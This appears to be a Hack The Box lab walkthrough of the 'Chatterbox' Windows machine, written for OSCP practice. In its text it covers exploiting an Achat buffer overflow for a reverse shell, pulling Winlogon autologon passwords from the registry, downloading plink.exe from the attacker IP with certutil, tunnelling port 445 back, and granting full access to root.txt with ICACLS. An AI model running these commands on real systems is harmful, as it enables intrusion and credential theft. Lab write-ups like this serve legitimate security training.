---

title: "Chatterbox HTB"
date: 2024-01-23 20:17:41 +0800
categories: [Chatterbox-HTB, Medium]
tags: [Chatterbox, Medium-Windows, HTB Walkthrough]

---




Fast forward to this series, I am working on all of the boxes that lead to OSCP. Mainly focusing on Thinking Methodology “Why we are doing what we’re doing.” End of the road, I am gonna create a mind map. Please shower me with constructive feedback. I try to improve as I progress.
![Untitled](https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*24foep-47CWMtb8Fz3zIMg.png)
Analyzing Nmap result:
![Untitled](https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*e6AwroFCXX4HFoTJxHgh2A.png)
There’s a 9255 and 9256 ports one is TCP & the other one is UDP. Both are functioning as an Achat Chat system httpd.
The operating system is Windows 7601 Service Pack 1.
The port we have discovered is 9256(UDP, Achat). Upon searching for vulnerabilities through searchsploit.
![Untitled](https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*5ljW0dw_00Ply9T5lpKYgQ.png)
we can spot this vulnerability, Remote Buffer Overflow.
![Untitled](https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*zpsdHj3ZyNk4saBT-zlB-Q.png)
Upon inspecting the payload, we can see that all the bad characters are already placed for us. Upon execution, it is running calc.exe in order for the payload to be worked.
![Untitled](https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*Ic-6z9V3CDyXKP6SADye3w.png)
There are 2 ways of getting an initial foothold onto the system with this exploit. It can be more with Metasploit exploit. This procedure is based on no metasploit methods. This is better because this machine resembles OSCP boxes, where the use of Metasploit is limited to one machine.
Seeing the payload size is limited to around 512 bytes, which is relatively very low.
we can normally use staged payloads here. So, it will be taking fewer bytes now. And execute back from the victim machine later.
![Untitled](https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*ivVbi_wp1Lhkpmg7cPgZmA.png)
So, for this exploit to work, we have to create a payload. The bad characters are already written for us inside the code. Just needed to add address and payload options to gain a shell. In this case a reverse shell. So you can generate the following payload.
Example payload:
![Untitled](https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*7q5-m5tXVzXn00Vs0DUfLg.png)
![Untitled](https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*D6HEfLckIhwF9Z73DF5hJw.png)
For this method to work, we need to run a Python server. While hosting the InvokeTcp Reverse shell PowerShell file from Nishang’s Powershell scripts. 
![Untitled](https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*xXajxGgC-E8AZDj6yd-kPA.png)
Don’t forget to add Invoke-PowershellTcp -Reverse -IPAddress <IP> -Port 443 at the end of the file inside the Powershell script which you have been uploading.
![Untitled](https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*e67VmQ5PtjMar_wUGMWR4g.png)
![Untitled](https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*pboXtj_KjYgKqWEtQ9ChMw.png)
And and, This can get you the shell you are looking for…
![Untitled](https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*EtqnVHt_rBD29oTNlbGm6A.png)
Method #2:
Non-Staged vs Staged Payloads:
![Untitled](https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*SBiXvlmSH8sc371bTDzYXw.png)
![Untitled](https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*Gtsl95OI8vFywfWDVVQ9uw.png)
![Untitled](https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*EtqnVHt_rBD29oTNlbGm6A.png)
![Untitled](https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*PCppnQ8PrC-sNvQpwqSNuQ.png)
And Tada!! User flag is found.
Still, we can’t access the root.txt inside the administrator directory.
![Untitled](https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*O0iiQaq5UaIYi_aIFkSq0A.png)
reg query “HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon” 2>nul | findstr “DefaultUserName DefaultDomainName DefaultPassword”
![Untitled](https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*f9YVn847vWrJ9U2HvanuCg.png)
we got the Alfred user’s password. we got some results out of system enumeration.
Let us continue to surf more with network enumeration.
netstat -ano → for information about ports that were running on the system.
![Untitled](https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*AKEUqRSR4ZTXBeMax0U6cw.png)
![Untitled](https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*9CdczkZH2LygXGfBgvKxyg.png)
Seem’s like these two ports 135 and 445 are invisible from our scan.
So, these ports are open on the local network and invisible to the outside network with an Nmap scan. And yes we can absolutely use port forwarding similar to the SSH port forwarding. Since we have no active SSH connection right now.
Using a Putty tunnel can be a better option since it supports port forwarding. If we are able to establish a putty connection from the Alfred machine. Then we might have a chance of escalating the privileges further.
certutil -urlcache -f http://10.10.14.89/plink.exe plink.exe
![Untitled](https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*jjSdPGk1v7V2sbG1qezsnw.png)
![Untitled](https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*kj9K78F5lAeDMS_dEznnTQ.png)
I was using this 32-bit executable from the Putty website.
after getting our putty on the victim machine.
Make sure the root access is permitted from our Kali machine with making sure changing this setting and configuring the SSH at line 32.
![Untitled](https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*x_X56qKvfeO0vNj5PyeQ1A.png)
![Untitled](https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*QRponplwzuVSX6T2DHJc2w.png)
![Untitled](https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*4Lo9KIDBDA5QFpDoMYTKCQ.png)
Change this from 22 to a random working port if this method doesn’t work then try again. Since my HTB is blocking away 22 ports for some reason.      
![Untitled](https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*SSwe09oAG3D71Fq8_zaRzg.png)
plink.exe -l kali -pw toor -P 4545 -R 445:127.0.0.1:445 10.10.14.89
Can get us access to our root shell. So, basically, it sign in our box as root to the inside chatterbox machine. This didn’t work in my case.
![Untitled](https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*nVruvgytcDye11irtHqVxQ.png)
![Untitled](https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*dejAdN7LNyl5MzmVwIOdcg.png)
![Untitled](https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*f1M7qMPDkWpKg2hKlMn2bQ.png)
Going forward I have tried the Metasploit method but it didn’t as well.
![Untitled](https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*FzE-mgeoZRWRRRWV9JqLOg.gif)
Method #2:
Since we are given access to the Administrator directory but seems like we don’t have access to the root.txt file inside it.
I was running around trying gigantic things this is so simple approach.
![Untitled](https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*Yfva923reyBCyRrJDgBVqg.png)
![Untitled](https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*Q8-qqQ8KSa4rtKsMH9cP5g.png)
ICACLS root.txt /grant “Users”: F
After this, we can easily access it.
![Untitled](https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*OYZdIRMIjTl322D_fM1Oxw.png)
And we got ROOOOOT Flag!!
![Untitled](https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*F2Qnd1q91RmYQB71t2og2A.png)
![Untitled](https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*FvXmzjMkTPwwCPSXM6lwKA.gif)
But it still is a good learning curve,
You’ll get to use System Enumeration commands to find hidden passwords. And how to Execute PowerShell commands on the victim machine remotely with Windows/exec CMD. File transfers. Upgrading the Netcat shell to Meterpreter shell. Finally Elevating File permissions. I did learn a lot of cool tricks out of this machine. Hopefully, you had fun too.
![Untitled](https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*g35dlV5KPNCQXBmTtL3GfQ.gif)
why we are doing, what we are doing?
![Untitled](https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*yzbm8C05oJ5xmCHMbXXQlw.png)
![Untitled](https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*dp0mmFA_Z4_PceJK36MRkw.png)
Thank you for following up.